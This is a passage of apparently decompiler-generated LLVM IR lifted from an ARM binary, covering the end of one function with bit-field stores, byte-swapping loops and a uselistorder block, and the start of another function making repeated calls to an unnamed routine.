  store i32 %v0_b85c, i32* %v3_b85c, align 4
  %v0_b860 = load i32, i32* %r2.global-to-local, align 4
  %v1_b860 = or i32 %v0_b860, 1
  store i32 %v1_b860, i32* %r2.global-to-local, align 4
  %v0_b864 = load i32, i32* %r3.global-to-local, align 4
  %v1_b864 = add i32 %v0_b864, 4
  %v2_b864 = inttoptr i32 %v1_b864 to i32*
  %v3_b864 = load i32, i32* %v2_b864, align 4
  store i32 %v3_b864, i32* %r1.global-to-local, align 4
  %v1_b868 = add i32 %v0_b864, 14
  %v2_b868 = inttoptr i32 %v1_b868 to i16*
  %v3_b868 = load i16, i16* %v2_b868, align 2
  %v4_b868 = zext i16 %v3_b868 to i32
  store i32 %v4_b868, i32* %r3.global-to-local, align 4
  %v1_b86c = trunc i32 %v1_b860 to i8
  %v2_b86c = load i32, i32* @r8, align 4
  %v3_b86c = add i32 %v2_b86c, 13
  %v4_b86c = inttoptr i32 %v3_b86c to i8*
  store i8 %v1_b86c, i8* %v4_b86c, align 1
  %v0_b870 = load i32, i32* %r3.global-to-local, align 4
  %v1_b870 = trunc i32 %v0_b870 to i16
  %v2_b870 = load i32, i32* @r8, align 4
  %v3_b870 = add i32 %v2_b870, 2
  %v4_b870 = inttoptr i32 %v3_b870 to i16*
  store i16 %v1_b870, i16* %v4_b870, align 2
  %v0_b874 = load i32, i32* @r8, align 4
  %v1_b874 = add i32 %v0_b874, 12
  %v2_b874 = inttoptr i32 %v1_b874 to i8*
  %v3_b874 = load i8, i8* %v2_b874, align 1
  %v4_b874 = zext i8 %v3_b874 to i32
  store i32 %v4_b874, i32* %r3.global-to-local, align 4
  %v1_b878 = add i32 %v0_b874, 13
  %v2_b878 = inttoptr i32 %v1_b878 to i8*
  %v3_b878 = load i8, i8* %v2_b878, align 1
  %v4_b878 = zext i8 %v3_b878 to i32
  %tmp104 = urem i8 %v3_b874, 16
  %v1_b87c = zext i8 %tmp104 to i32
  %v1_b880 = or i32 %v1_b87c, 128
  store i32 %v1_b880, i32* %r3.global-to-local, align 4
  %v1_b884 = or i32 %v4_b878, 16
  store i32 %v1_b884, i32* %r2.global-to-local, align 4
  %v0_b888 = load i32, i32* %r1.global-to-local, align 4
  %v2_b888 = add i32 %v0_b874, 8
  %v3_b888 = inttoptr i32 %v2_b888 to i32*
  store i32 %v0_b888, i32* %v3_b888, align 4
  %v0_b88c = load i32, i32* %r3.global-to-local, align 4
  %v1_b88c = trunc i32 %v0_b88c to i8
  %v2_b88c = load i32, i32* @r8, align 4
  %v3_b88c = add i32 %v2_b88c, 12
  %v4_b88c = inttoptr i32 %v3_b88c to i8*
  store i8 %v1_b88c, i8* %v4_b88c, align 1
  %v0_b890 = load i32, i32* %r2.global-to-local, align 4
  %v1_b890 = trunc i32 %v0_b890 to i8
  %v2_b890 = load i32, i32* @r8, align 4
  %v3_b890 = add i32 %v2_b890, 13
  %v4_b890 = inttoptr i32 %v3_b890 to i8*
  store i8 %v1_b890, i8* %v4_b890, align 1
  %v0_b894 = call i32 @function_e0d0()
  %v1_b894 = trunc i32 %v0_b894 to i16
  store i32 %v0_b894, i32* %r0.global-to-local, align 4
  store i32 %v1_b3d8, i32* %r1.global-to-local, align 4
  %v0_b89c = load i32, i32* @r8, align 4
  %v1_b89c = add i32 %v0_b89c, 13
  %v2_b89c = inttoptr i32 %v1_b89c to i8*
  %v3_b89c = load i8, i8* %v2_b89c, align 1
  %v4_b89c = zext i8 %v3_b89c to i32
  store i32 %v1_b8a0, i32* %r2.global-to-local, align 4
  %v1_b8a4 = and i32 %v4_b89c, 223
  %v5_b8a8 = or i32 %v1_b8a4, %v4_b8a8
  store i32 %v5_b8a8, i32* %r3.global-to-local, align 4
  %v1_b8ac = trunc i32 %v5_b8a8 to i8
  store i8 %v1_b8ac, i8* %v2_b89c, align 1
  store i32 %v1_b3f8, i32* %ip.global-to-local, align 4
  %v0_b8b4 = load i32, i32* @r8, align 4
  %v1_b8b4 = add i32 %v0_b8b4, 13
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i8*
  %v3_b8b4 = load i8, i8* %v2_b8b4, align 1
  %v4_b8b4 = zext i8 %v3_b8b4 to i32
  store i32 %v1_b8b8, i32* %r3.global-to-local, align 4
  %v1_b8bc = and i32 %v4_b8b4, 239
  %v5_b8c0 = or i32 %v1_b8bc, %v4_b8c0
  store i32 %v5_b8c0, i32* %r2.global-to-local, align 4
  %v1_b8c4 = trunc i32 %v5_b8c0 to i8
  store i8 %v1_b8c4, i8* %v2_b8b4, align 1
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v0_b8cc = load i32, i32* @r8, align 4
  %v1_b8cc = add i32 %v0_b8cc, 13
  %v2_b8cc = inttoptr i32 %v1_b8cc to i8*
  %v3_b8cc = load i8, i8* %v2_b8cc, align 1
  %v4_b8cc = zext i8 %v3_b8cc to i32
  store i32 %v1_b8d0, i32* %r2.global-to-local, align 4
  %v1_b8d4 = and i32 %v4_b8cc, 247
  %v5_b8d8 = or i32 %v1_b8d4, %v4_b8d8
  store i32 %v5_b8d8, i32* %r3.global-to-local, align 4
  %v1_b8dc = trunc i32 %v5_b8d8 to i8
  store i8 %v1_b8dc, i8* %v2_b8cc, align 1
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b8e4 = load i32, i32* @r8, align 4
  %v1_b8e4 = add i32 %v0_b8e4, 13
  %v2_b8e4 = inttoptr i32 %v1_b8e4 to i8*
  %v3_b8e4 = load i8, i8* %v2_b8e4, align 1
  %v4_b8e4 = zext i8 %v3_b8e4 to i32
  store i32 %v1_b8e8, i32* %r3.global-to-local, align 4
  %v1_b8ec = and i32 %v4_b8e4, 251
  %v5_b8f0 = or i32 %v1_b8ec, %v4_b8f0
  store i32 %v5_b8f0, i32* %r2.global-to-local, align 4
  %v1_b8f4 = trunc i32 %v5_b8f0 to i8
  store i8 %v1_b8f4, i8* %v2_b8e4, align 1
  store i32 %v1_b458, i32* %r1.global-to-local, align 4
  %v0_b8fc = load i32, i32* @r8, align 4
  %v1_b8fc = add i32 %v0_b8fc, 13
  %v2_b8fc = inttoptr i32 %v1_b8fc to i8*
  %v3_b8fc = load i8, i8* %v2_b8fc, align 1
  %v4_b8fc = zext i8 %v3_b8fc to i32
  store i32 %v1_b900, i32* %r2.global-to-local, align 4
  %v1_b904 = and i32 %v4_b8fc, 253
  %v4_b908 = or i32 %v1_b904, %v3_b908
  store i32 %v4_b908, i32* %r3.global-to-local, align 4
  %v1_b90c = trunc i32 %v4_b908 to i8
  store i8 %v1_b90c, i8* %v2_b8fc, align 1
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b914 = load i32, i32* @r8, align 4
  %v1_b914 = add i32 %v0_b914, 13
  %v2_b914 = inttoptr i32 %v1_b914 to i8*
  %v3_b914 = load i8, i8* %v2_b914, align 1
  %v4_b914 = zext i8 %v3_b914 to i32
  %v1_b91c = and i32 %v4_b914, 254
  store i32 %v1_b91c, i32* %r2.global-to-local, align 4
  %v2_b920 = or i32 %v1_b91c, %v1_b918
  store i32 %v2_b920, i32* %r3.global-to-local, align 4
  %v1_b924 = trunc i32 %v2_b920 to i8
  store i8 %v1_b924, i8* %v2_b914, align 1
  %v3_b928 = load i32, i32* @r8, align 4
  %v4_b928 = add i32 %v3_b928, 14
  %v5_b928 = inttoptr i32 %v4_b928 to i16*
  store i16 %v1_b894, i16* %v5_b928, align 2
  store i32 %v6_b490, i32* %r1.global-to-local, align 4
  %v0_b930 = load i32, i32* @r4, align 4
  %v1_b930 = add i32 %v0_b930, 40
  store i32 %v1_b930, i32* %r0.global-to-local, align 4
  %v2_b934 = inttoptr i32 %v1_b930 to i16*
  %v3_b934 = call i32 @function_e264(i16* %v2_b934, i32 %v6_b490)
  store i32 %v3_b934, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b688

dec_label_pc_b93c:                                ; preds = %dec_label_pc_b4fc
  store i32 %v6_b490, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b490, 40
  br label %dec_label_pc_b94c

dec_label_pc_b94c:                                ; preds = %dec_label_pc_b69c, %dec_label_pc_b93c
  %storemerge6.pre-phi = phi i32 [ %v1_b78c, %dec_label_pc_b69c ], [ %.pre, %dec_label_pc_b93c ]
  %v0_b96026 = phi i32 [ %v1_b690, %dec_label_pc_b69c ], [ 0, %dec_label_pc_b93c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b490, 65536
  %storemerge = add i32 %v6_b490, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b94c = add i32 %storemerge4, 1310720
  store i32 %v1_b94c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b94c, 256
  %v3_b954 = and i32 %tmp83, 65280
  store i32 %v3_b954, i32* %r3.global-to-local, align 4
  %v4_b958 = udiv i32 %v1_b94c, 16777216
  %v5_b958 = or i32 %v3_b954, %v4_b958
  store i32 %v5_b958, i32* @r8, align 4
  %v2_ba84 = icmp eq i32 %v1_b4b0, 0
  br label %dec_label_pc_b95c

dec_label_pc_b95c:                                ; preds = %dec_label_pc_b95c, %dec_label_pc_ba68, %dec_label_pc_b94c
  %v0_b960 = phi i32 [ %v0_b96026, %dec_label_pc_b94c ], [ 0, %dec_label_pc_ba68 ], [ 0, %dec_label_pc_b95c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b960 = icmp eq i32 %v0_b960, 0
  store i1 %v2_b960, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b960, label %dec_label_pc_b95c, label %dec_label_pc_b96c

dec_label_pc_b96c:                                ; preds = %dec_label_pc_b95c, %dec_label_pc_ba68
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b970

dec_label_pc_b970:                                ; preds = %dec_label_pc_b998, %dec_label_pc_b96c
  %v1_b978 = phi i32 [ %v1_ba58, %dec_label_pc_b998 ], [ 0, %dec_label_pc_b96c ]
  store i32 %v2_b31c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b978 = mul i32 %v1_b978, 4
  %v5_b978 = add i32 %v4_b978, %v2_b31c
  %v6_b978 = inttoptr i32 %v5_b978 to i32*
  %v7_b978 = load i32, i32* %v6_b978, align 4
  store i32 %v7_b978, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b980 = load i32, i32* @fp, align 4
  %v9_b980 = icmp eq i32 %v0_b980, 65535
  store i1 %v9_b980, i1* %cpsr_z.global-to-local, align 1
  %v1_b984 = add i32 %v7_b978, 20
  store i32 %v1_b984, i32* @r5, align 4
  br i1 %v9_b980, label %dec_label_pc_ba7c, label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b970
  store i32 %v1_b4b0, i32* %r3.global-to-local, align 4
  store i1 %v2_ba84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ba84, label %dec_label_pc_b998, label %dec_label_pc_ba90

dec_label_pc_b998:                                ; preds = %dec_label_pc_b98c, %dec_label_pc_ba7c, %dec_label_pc_ba90
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b99c = load i32, i32* @r4, align 4
  %v3_b99c = add i32 %v2_b99c, 10
  %v4_b99c = inttoptr i32 %v3_b99c to i16*
  store i16 0, i16* %v4_b99c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b9a4 = load i32, i32* @r4, align 4
  store i32 %v0_b9a4, i32* @r0, align 4
  %v2_b9a8 = call i32 @function_c848(i32 %v0_b9a4, i32 20)
  %v3_b9a8 = trunc i32 %v2_b9a8 to i16
  store i32 %v2_b9a8, i32* %r0.global-to-local, align 4
  %v3_b9ac = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b30c, i32* %r2.global-to-local, align 4
  %v3_b9b4 = mul i32 %v3_b9ac, 16
  %v2_b9b8 = add i32 %v3_b9b4, %v2_b30c
  store i32 %v2_b9b8, i32* %r1.global-to-local, align 4
  %v1_b9bc = add i32 %v2_b9b8, 4
  %v2_b9bc = inttoptr i32 %v1_b9bc to i32*
  %v3_b9bc = load i32, i32* %v2_b9bc, align 4
  %v3_b9c0 = mul i32 %v3_b9bc, 65536
  store i32 %v3_b9c0, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b9bc, 256
  %v1_b9c8 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b9bc, 256
  %v4_b9cc = urem i32 %tmp86, 256
  %v5_b9cc = or i32 %v4_b9cc, %v1_b9c8
  store i32 %v5_b9cc, i32* %r3.global-to-local, align 4
  %v1_b9d0 = add i32 %v3_b9bc, 1
  store i32 %v1_b9d0, i32* %r2.global-to-local, align 4
  store i32 %v1_b9d0, i32* %v2_b9bc, align 4
  %v0_b9d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b9d8 = load i32, i32* @r5, align 4
  %v2_b9d8 = add i32 %v1_b9d8, 4
  %v3_b9d8 = inttoptr i32 %v2_b9d8 to i32*
  store i32 %v0_b9d8, i32* %v3_b9d8, align 4
  %v0_b9dc = load i32, i32* %r1.global-to-local, align 4
  %v1_b9dc = add i32 %v0_b9dc, 8
  %v2_b9dc = inttoptr i32 %v1_b9dc to i32*
  %v3_b9dc = load i32, i32* %v2_b9dc, align 4
  %tmp87 = mul i32 %v3_b9dc, 256
  %v1_b9e8 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b9dc, 256
  %v4_b9ec = urem i32 %tmp88, 256
  %v5_b9ec = or i32 %v4_b9ec, %v1_b9e8
  %v1_b9f0 = load i32, i32* @r5, align 4
  %v2_b9f0 = add i32 %v1_b9f0, 8
  %v3_b9f0 = inttoptr i32 %v2_b9f0 to i32*
  store i32 %v5_b9ec, i32* %v3_b9f0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b9f8 = load i32, i32* @r4, align 4
  %v4_b9f8 = add i32 %v3_b9f8, 10
  %v5_b9f8 = inttoptr i32 %v4_b9f8 to i16*
  store i16 %v3_b9a8, i16* %v5_b9f8, align 2
  %v0_b9fc = load i32, i32* @r5, align 4
  store i32 %v0_b9fc, i32* @r1, align 4
  %v0_ba00 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba00 = trunc i32 %v0_ba00 to i16
  %v3_ba00 = add i32 %v0_b9fc, 16
  %v4_ba00 = inttoptr i32 %v3_ba00 to i16*
  store i16 %v1_ba00, i16* %v4_ba00, align 2
  %v0_ba04 = load i32, i32* @r8, align 4
  store i32 %v0_ba04, i32* %r2.global-to-local, align 4
  %v0_ba08 = load i32, i32* @sl, align 4
  store i32 %v0_ba08, i32* %r3.global-to-local, align 4
  %v0_ba0c = load i32, i32* @r4, align 4
  store i32 %v0_ba0c, i32* %r0.global-to-local, align 4
  %v4_ba10 = call i32 @function_c898(i32 %v0_ba0c, i32 %v0_b9fc, i32 %v0_ba04, i32 %v0_ba08)
  %v5_ba10 = trunc i32 %v4_ba10 to i16
  store i32 %v4_ba10, i32* %r0.global-to-local, align 4
  %v3_ba14 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba14, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_ba1c = mul i32 %v3_ba14, 32
  store i32 %v3_ba1c, i32* %lr.global-to-local, align 4
  %v3_ba20 = load i32, i32* @r5, align 4
  %v4_ba20 = add i32 %v3_ba20, 16
  %v5_ba20 = inttoptr i32 %v4_ba20 to i16*
  store i16 %v5_ba10, i16* %v5_ba20, align 2
  %v0_ba24 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba24 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_ba24, -8
  %v5_ba24 = add i32 %v0_ba24, %tmp105
  store i32 %v5_ba24, i32* %lr.global-to-local, align 4
  %v0_ba28 = load i32, i32* @r5, align 4
  %v1_ba28 = add i32 %v0_ba28, 2
  %v2_ba28 = inttoptr i32 %v1_ba28 to i16*
  %v3_ba28 = load i16, i16* %v2_ba28, align 2
  %v1_ba2c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba2c = add i32 %v1_ba2c, %v5_ba24
  store i32 %v2_ba2c, i32* @lr, align 4
  %v3_ba30 = add i32 %v2_ba2c, 2
  %v4_ba30 = inttoptr i32 %v3_ba30 to i16*
  store i16 %v3_ba28, i16* %v4_ba30, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ba3c = load i32, i32* @r4, align 4
  store i32 %v0_ba3c, i32* %r1.global-to-local, align 4
  %v0_ba40 = load i32, i32* @sb, align 4
  store i32 %v0_ba40, i32* %r0.global-to-local, align 4
  %v0_ba44 = load i32, i32* @r7, align 4
  store i32 %v0_ba44, i32* %r2.global-to-local, align 4
  %v0_ba48 = load i32, i32* @lr, align 4
  %v6_ba50 = call i32 @function_11a68(i32 %v0_ba40, i32 %v0_ba3c, i32 %v0_ba44, i32 16384, i32 %v0_ba48, i32 16)
  %v3_ba54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba54, i32* %r3.global-to-local, align 4
  %v1_ba58 = add i32 %v3_ba54, 1
  store i32 %v1_ba58, i32* %r0.global-to-local, align 4
  %v0_ba5c = load i32, i32* @r6, align 4
  %v9_ba5c = icmp eq i32 %v0_ba5c, %v1_ba58
  store i1 %v9_ba5c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ba58, i32* %stack_var_-44, align 4
  %v8_ba64 = icmp sgt i32 %v0_ba5c, %v1_ba58
  br i1 %v8_ba64, label %dec_label_pc_b970, label %dec_label_pc_ba68

dec_label_pc_ba68:                                ; preds = %dec_label_pc_b998
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ba6c = icmp eq i32 %v0_ba5c, 0
  store i1 %v2_ba6c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_ba6c, label %dec_label_pc_b95c, label %dec_label_pc_b96c

dec_label_pc_ba7c:                                ; preds = %dec_label_pc_b970
  %v0_ba7c = call i32 @function_e0d0()
  %v1_ba7c = trunc i32 %v0_ba7c to i16
  store i32 %v0_ba7c, i32* %r0.global-to-local, align 4
  store i32 %v1_b4b0, i32* %r3.global-to-local, align 4
  store i1 %v2_ba84, i1* %cpsr_z.global-to-local, align 1
  %v3_ba88 = load i32, i32* @r4, align 4
  %v4_ba88 = add i32 %v3_ba88, 4
  %v5_ba88 = inttoptr i32 %v4_ba88 to i16*
  store i16 %v1_ba7c, i16* %v5_ba88, align 2
  br i1 %v2_ba84, label %dec_label_pc_b998, label %dec_label_pc_ba7c.dec_label_pc_ba90_crit_edge

dec_label_pc_ba7c.dec_label_pc_ba90_crit_edge:    ; preds = %dec_label_pc_ba7c
  %v0_ba90.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ba90

dec_label_pc_ba90:                                ; preds = %dec_label_pc_ba7c.dec_label_pc_ba90_crit_edge, %dec_label_pc_b98c
  %v0_ba90 = phi i32 [ %v0_ba90.pre, %dec_label_pc_ba7c.dec_label_pc_ba90_crit_edge ], [ %v7_b978, %dec_label_pc_b98c ]
  %v1_ba90 = add i32 %v0_ba90, 40
  store i32 %v1_ba90, i32* %r0.global-to-local, align 4
  store i32 %v6_b490, i32* %r1.global-to-local, align 4
  %v2_ba98 = inttoptr i32 %v1_ba90 to i16*
  %v3_ba98 = call i32 @function_e264(i16* %v2_ba98, i32 %v6_b490)
  store i32 %v3_ba98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b998

; uselistorder directives
  uselistorder i32 %v0_ba7c, { 1, 0 }
  uselistorder i32 %v1_ba58, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ba24, { 1, 0 }
  uselistorder i32 %v4_ba10, { 1, 0 }
  uselistorder i32 %v3_b9dc, { 1, 0 }
  uselistorder i32 %v3_b9bc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b9a8, { 1, 0 }
  uselistorder i1 %v2_ba84, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b894, { 1, 0 }
  uselistorder i32 %v0_b7cc, { 1, 0 }
  uselistorder i32 %v5_b760, { 1, 0 }
  uselistorder i32 %v0_b720, { 1, 0 }
  uselistorder i32 %v0_b6dc, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b68c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b678, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b604, { 1, 0 }
  uselistorder i32 %v6_b5fc, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b62c, { 1, 0 }
  uselistorder i32 %v4_b640, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b588, { 1, 0, 2 }
  uselistorder i32 %v0_b738, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b578, { 1, 0 }
  uselistorder i1 %v7_b570, { 1, 0, 2 }
  uselistorder i1 %v7_b524, { 1, 0 }
  uselistorder i32 %v3_b520, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b900, { 1, 0 }
  uselistorder i32 %v1_b8e8, { 1, 0 }
  uselistorder i32 %v1_b8d0, { 1, 0 }
  uselistorder i32 %v1_b8b8, { 1, 0 }
  uselistorder i32 %v1_b8a0, { 1, 0 }
  uselistorder i32 %v3_b638, { 1, 0 }
  uselistorder i1 %v2_b654, { 1, 0 }
  uselistorder i32 %v1_b650, { 1, 0 }
  uselistorder i32 %v4_b64c, { 2, 0, 1 }
  uselistorder i32 %v2_b560, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b4fc, { 1, 0 }
  uselistorder i1 %v7_b4f4, { 1, 0 }
  uselistorder i1 %v7_b4c8, { 1, 0 }
  uselistorder i32 %v3_b4c4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b4b0, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b490, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b458, { 1, 0 }
  uselistorder i32 %v1_b438, { 1, 0 }
  uselistorder i32 %v1_b418, { 1, 0 }
  uselistorder i32 %v1_b3f8, { 1, 0 }
  uselistorder i32 %v1_b3d8, { 1, 0 }
  uselistorder i32 %v6_b3b4, { 1, 0 }
  uselistorder i32 %v1_b39c, { 1, 0 }
  uselistorder i8 %v5_b354, { 1, 0 }
  uselistorder i32 %v6_b334, { 1, 0 }
  uselistorder i32 %v2_b31c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b30c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 17, 13, 14, 15, 16, 20, 18, 19, 22, 21, 23, 26, 25, 24, 27, 28, 29, 32, 33, 30, 1, 35, 34, 36, 37, 38, 40, 39, 31, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b998, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b96c, { 1, 0 }
  uselistorder label %dec_label_pc_b95c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b94c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b6b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b688, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b5c4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b5a4, { 1, 0 }
  uselistorder label %dec_label_pc_b580, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b530, { 1, 0 }
  uselistorder label %dec_label_pc_b514, { 1, 0 }
}

define i32 @function_baa4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_baa4:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_baa4 = load i32, i32* @sb, align 4
  %v24_baa4 = load i32, i32* @fp, align 4
  %v27_baa4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bac0 = call i32 @function_12654(i32 %arg1, i32 4)
  %v0_bac4 = load i32, i32* @r5, align 4
  store i32 %v0_bac4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bad4 = load i32, i32* @r4, align 4
  store i32 %v0_bad4, i32* %r0.global-to-local, align 4
  %v5_bad8 = inttoptr i32 %v0_bac4 to i32*
  %v6_bad8 = call i32 @function_8570(i32 %v0_bad4, i32* %v5_bad8, i32 2, i32 0)
  %v1_bae4 = urem i32 %v6_bad8, 256
  store i32 %v1_bae4, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_baf0 = load i32, i32* @r5, align 4
  store i32 %v0_baf0, i32* %r1.global-to-local, align 4
  %v0_baf4 = load i32, i32* @r4, align 4
  store i32 %v0_baf4, i32* %r0.global-to-local, align 4
  %v6_bafc = inttoptr i32 %v0_baf0 to i32*
  %v7_bafc = call i32 @function_8570(i32 %v0_baf4, i32* %v6_bafc, i32 3, i32 65535)
  %v0_bb00 = load i32, i32* @r5, align 4
  store i32 %v0_bb00, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bafc, i32* %sb.global-to-local, align 4
  %v0_bb10 = load i32, i32* @r4, align 4
  store i32 %v0_bb10, i32* %r0.global-to-local, align 4
  %v4_bb14 = inttoptr i32 %v0_bb00 to i32*
  %v5_bb14 = call i32 @function_8570(i32 %v0_bb10, i32* %v4_bb14, i32 4, i32 64)
  %v1_bb1c = urem i32 %v5_bb14, 256
  store i32 %v1_bb1c, i32* %ip.global-to-local, align 4
  %v0_bb20 = load i32, i32* @r5, align 4
  store i32 %v0_bb20, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb2c = load i32, i32* @r4, align 4
  store i32 %v0_bb2c, i32* %r0.global-to-local, align 4
  %v6_bb34 = inttoptr i32 %v0_bb20 to i32*
  %v7_bb34 = call i32 @function_8570(i32 %v0_bb2c, i32* %v6_bb34, i32 5, i32 0)
  %v1_bb40 = urem i32 %v7_bb34, 256
  store i32 %v1_bb40, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_bb4c = load i32, i32* @r5, align 4
  store i32 %v0_bb4c, i32* %r1.global-to-local, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* %r0.global-to-local, align 4
